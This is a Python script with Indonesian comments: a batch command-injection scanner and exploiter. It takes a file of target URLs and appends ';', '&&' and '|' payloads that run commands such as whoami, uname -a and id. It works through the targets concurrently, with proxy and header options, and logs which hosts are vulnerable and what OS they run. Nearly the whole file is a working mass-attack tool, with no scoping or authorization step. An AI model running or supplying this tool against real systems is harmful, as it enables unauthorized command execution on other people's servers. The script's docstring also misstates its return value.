#!/usr/bin/env python3
"""
Tool Batch Command Injection Scanner & Exploiter

Penjelasan singkat:
- Membaca target URL dari file input
- Mencoba payload command injection dengan berbagai pola
- Mendukung concurrent scanning dengan thread pool
- Menyimpan hasil ke file output CSV beserta detail OS
- Mendukung opsi custom perintah uji, timeout, retry, proxy, dan headers
- Log aktivitas ke file terpisah

Cara penggunaan:
    python3 cmd_injection_tool.py \
        --input targets.txt \
        --output hasil_scan.csv \
        --threads 10 \
        --timeout 5 \
        --retries 2 \
        --commands whoami,uname -a,id \
        --proxy http://127.0.0.1:8080

"""
import requests
import argparse
import csv
import threading
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# Inisialisasi logger
logging.basicConfig(
    filename='scan_log.log',
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

class CommandInjectionTool:
    def __init__(self, url, commands, timeout, retries, proxies, headers):
        self.url = url.rstrip('?&')
        self.commands = commands
        self.payload_patterns = [';{}', '&&{}', '|{}']
        self.timeout = timeout
        self.session = requests.Session()
        # Konfigurasi retry
        retry_strategy = Retry(
            total=retries,
            backoff_factor=0.5,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy)
        self.session.mount('http://', adapter)
        self.session.mount('https://', adapter)
        self.session.proxies = proxies or {}
        self.session.headers.update(headers or {})

    def scan(self):
        """
        Coba deteksi command injection pada satu URL.
        Mengembalikan tuple: (url, vulnerable_bool, os_type atau '-')
        """
        for pattern in self.payload_patterns:
            for cmd in self.commands:
                payload = pattern.format(cmd)
                target = self.url + payload
                try:
                    resp = self.session.get(target, timeout=self.timeout)
                    if cmd in resp.text:
                        os_type = 'Linux' if 'Linux' in resp.text else 'Windows'
                        return True, os_type
                except requests.RequestException as e:
                    logging.warning(f"Gagal request {target}: {e}")
        return False, '-'


def main():
    parser = argparse.ArgumentParser(
        description='Batch Scanner Command Injection (Bahasa Indonesia)'
    )
    parser.add_argument('--input', required=True,
                        help='File teks (.txt) berisi daftar URL target per baris')
    parser.add_argument('--output', required=True,
                        help='File CSV untuk menyimpan hasil scan')
    parser.add_argument('--threads', type=int, default=5,
                        help='Jumlah worker threads (default: 5)')
    parser.add_argument('--timeout', type=int, default=5,
                        help='Timeout request dalam detik (default: 5)')
    parser.add_argument('--retries', type=int, default=1,
                        help='Jumlah retry pada koneksi (default: 1)')
    parser.add_argument('--commands', default='whoami,uname -a,id',
                        help='Daftar perintah untuk uji, pisahkan dengan koma')
    parser.add_argument('--proxy', default=None,
                        help='URL proxy (contoh: http://127.0.0.1:8080)')
    parser.add_argument('--header', action='append', default=[],
                        help='Header tambahan (contoh: "User-Agent:Custom")')
    args = parser.parse_args()

    # Persiapan proxy dan headers
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else {}
    headers = {}
    for h in args.header:
        key, val = h.split(':', 1)
        headers[key.strip()] = val.strip()

    # Baca URL target
    with open(args.input) as f:
        urls = [line.strip() for line in f if line.strip()]

    commands = [c.strip() for c in args.commands.split(',')]

    # Mulai thread pool scan
    results = []
    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        future_to_url = {
            executor.submit(
                CommandInjectionTool(url, commands, args.timeout, args.retries, proxies, headers).scan
            ): url for url in urls
        }
        for future in as_completed(future_to_url):
            url = future_to_url[future]
            try:
                vulnerable, os_type = future.result()
                status = 'VULNERABLE' if vulnerable else 'TIDAK RENTAN'
                print(f"[{status}] {url} | OS: {os_type}")
                logging.info(f"{url} => {status} | OS: {os_type}")
                results.append((url, status, os_type))
            except Exception as e:
                logging.error(f"Error scanning {url}: {e}")
                results.append((url, 'ERROR', '-'))

    # Simpan hasil ke CSV
    with open(args.output, 'w', newline='') as csvfile:
        fieldnames = ['URL', 'Status', 'OS']
        writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        writer.writeheader()
        for url, status, os_type in results:
            writer.writerow({'URL': url, 'Status': status, 'OS': os_type})

    print(f"[+] Selesai. Hasil disimpan di {args.output}")

if __name__ == '__main__':
    main()